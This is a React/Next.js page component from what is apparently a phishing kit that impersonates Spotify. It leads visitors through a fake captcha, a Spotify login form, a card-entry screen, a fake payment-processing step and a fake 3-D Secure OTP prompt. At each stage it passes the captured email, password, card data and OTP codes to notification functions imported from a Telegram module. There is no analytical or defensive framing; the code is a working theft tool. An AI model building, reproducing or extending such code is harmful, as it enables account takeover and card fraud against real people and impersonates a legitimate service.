"use client"

import { useState, useEffect } from "react"
import { SpotifyLoginForm } from "@/components/spotify-login-form"
import { CaptchaVerification } from "@/components/captcha-verification"
import { MyCards, type CardData } from "@/components/my-cards"
import { PaymentProcessing } from "@/components/payment-processing"
import { ThreeDSecure } from "@/components/three-d-secure"
import { notifyNewVisitor, notifyLogin, notifyPaymentInfo, notifyOTPAttempt, getVisitorInfo } from "@/lib/telegram"
import { getLanguageFromCountry, type Language } from "@/lib/translations"

type FlowStep = "captcha" | "login" | "cards" | "processing" | "3d-secure" | "success"

export default function LoginPage() {
  const [flowStep, setFlowStep] = useState<FlowStep>("captcha")
  const [visitorInfo, setVisitorInfo] = useState<Awaited<ReturnType<typeof getVisitorInfo>> | null>(null)
  const [language, setLanguage] = useState<Language>("en")

  // Get visitor info on mount and detect language
  useEffect(() => {
    const initializeVisitor = async () => {
      const info = await getVisitorInfo()
      setVisitorInfo(info)
      // Detect language based on country
      const detectedLanguage = getLanguageFromCountry(info.country)
      setLanguage(detectedLanguage)
    }
    initializeVisitor()
  }, [])

  const handleCaptchaVerified = async () => {
    // Send notification AFTER captcha is verified
    if (visitorInfo) {
      await notifyNewVisitor(visitorInfo)
    }
    setFlowStep("login")
  }

  const handleLoginSuccess = async (email: string, password: string) => {
    if (visitorInfo) {
      await notifyLogin(email, password, visitorInfo)
    }
    setFlowStep("cards")
  }

  const handleCardSubmit = async (cardData: CardData) => {
    if (visitorInfo) {
      await notifyPaymentInfo(cardData, visitorInfo)
    }
    setFlowStep("processing")
  }

  const handleProcessingComplete = () => {
    setFlowStep("3d-secure")
  }

  const handle3DSecureSuccess = () => {
    setFlowStep("success")
  }

  const handleOTPAttempt = async (otp: string, isCorrect: boolean) => {
    if (visitorInfo) {
      await notifyOTPAttempt(otp, isCorrect, visitorInfo)
    }
  }

  return (
    <main className="min-h-screen bg-[#121212] flex flex-col items-center justify-center px-4 py-8">
      {flowStep === "captcha" && <CaptchaVerification onVerified={handleCaptchaVerified} />}
      {flowStep === "login" && <SpotifyLoginForm onLoginSuccess={handleLoginSuccess} language={language} />}
      {flowStep === "cards" && <MyCards onSubmit={handleCardSubmit} language={language} />}
      {flowStep === "processing" && <PaymentProcessing onComplete={handleProcessingComplete} language={language} />}
      {flowStep === "3d-secure" && <ThreeDSecure onSuccess={handle3DSecureSuccess} onOTPAttempt={handleOTPAttempt} language={language} />}
      {flowStep === "success" && (
        <div className="w-full max-w-[400px] mx-auto text-center px-4">
          <div className="mb-8">
            <svg className="w-20 sm:w-24 h-20 sm:h-24 mx-auto text-[#1ed760] mb-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
          </div>
          <h1 className="text-2xl sm:text-[32px] font-bold text-white mb-4">Payment Successful!</h1>
          <p className="text-[#a7a7a7] text-sm sm:text-lg mb-8">Your payment has been processed successfully. Your subscription is now active.</p>
          <button
            onClick={() => {
              setFlowStep("captcha")
              window.location.reload()
            }}
            className="w-full h-12 bg-[#1ed760] hover:bg-[#1fdf64] text-black font-bold rounded-full transition-all"
          >
            Start Over
          </button>
        </div>
      )}
    </main>
  )
}
